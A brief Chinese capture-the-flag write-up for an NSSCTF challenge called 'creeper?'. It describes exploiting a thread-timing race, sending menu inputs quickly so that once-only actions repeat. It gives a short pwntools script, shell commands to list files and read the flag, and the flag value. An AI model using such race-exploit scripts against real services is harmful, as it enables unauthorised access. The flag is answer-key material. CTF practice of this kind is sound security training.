# creeper?

挖矿和分解枯木分别只能做一次，但线程的结束需要一些时间，保证输入选择的速度够快就可以做很多次。

```python
io.sendlineafter(b"> ", b"1")
for i in range(2):
    io.sendline(b"1")
    
io.sendlineafter(b"> ", b"2")
io.sendline(b"2")

sleep(1)

io.sendline(b"4")
```

```bash
ls
cat flag
```

Flag 为 `NSSCTF{9d545f7c-2643-4c60-b292-9b51eb67410e}` 。